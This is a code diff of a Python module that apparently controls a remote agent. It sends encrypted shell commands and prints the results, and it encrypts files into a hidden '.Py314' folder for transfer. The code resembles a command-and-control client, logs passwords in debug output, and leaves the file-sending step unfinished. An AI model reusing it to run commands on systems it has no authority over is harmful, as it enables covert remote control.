@@ -1,6 +1,8 @@
 
-import core.crypto as crypto
+import os
 import logging
+import core.crypto as crypto
+
 
 def Check(channel, password):
 
@@ -36,13 +38,49 @@ def Check(channel, password):
 def Send(channel, password, source, destination):
     """Send a file to remote agent"""
 
-    logger = logging.getLogger('main')
-    logger.debug('< Send module >')
+    try:
 
-    logger.debug(f"Channel given : {channel}")
-    logger.debug(f"Password given : {password}")
-    logger.debug(f"Source file given : {source}")
-    logger.debug(f"Destination file given : {destination}")
+        logger = logging.getLogger('main')
+        logger.debug('< Send module >')
+
+        logger.debug(f"Channel given : {channel}")
+        logger.debug(f"Password given : {password}")
+        logger.debug(f"Source file given : {source}")
+        logger.debug(f"Destination file given : {destination}")
+
+        homeFolder = os.environ['HOME']
+        py314Folder = f"{homeFolder}/.Py314"
+        tempFile = f"{py314Folder}/temp.crypt"
+        logger.debug(f"Temporary encrypted file : {tempFile}")
+
+        crypto.encrypt_file(password, source, tempFile)
+
+        message = f"send {source} {destination}"
+        encryptedMessage = crypto.encrypt_message(password, message)
+
+        channel.sendall(encryptedMessage.encode())
+
+        bufferSize = 4096
+        agentAnswer = b''
+        # While True, receive data
+        while True:
+            logger.debug('Waiting for agent answer about transfer...')
+            agentAnswer = channel.recv(bufferSize)
+            if len(agentAnswer) < bufferSize:
+                logger.debug('break recv while loop')
+                break
+
+
+
+
+
+
+    except Exception as error:
+        logger.warning('An error occured during sending file : ')
+        logger.warning(error)
+        
+    
+
 
 
 
@@ -65,9 +103,7 @@ def Shell(channel, password, command):
         pass
     else:
         # Else, send command to remote agent
-        logger.debug(f'Shell command before encryption : {command}')
         command = crypto.encrypt_message(password, command)
-        logger.debug(f'Shell command after encryption : {command}')
         channel.sendall(command.encode())
 
         rawResponse, tempBuffer = b'', b''
@@ -89,8 +125,7 @@ def Shell(channel, password, command):
         
         shellReponseEncrypted = rawResponse.decode()
         shellResponse = crypto.decrypt_message(password, shellReponseEncrypted)
-        logger.debug(f'Encrypted answer : {shellReponseEncrypted}')
-        logger.debug(f'Decrypted answer : {shellResponse}')
+
         # Print agent's answer
         print(shellResponse)
 
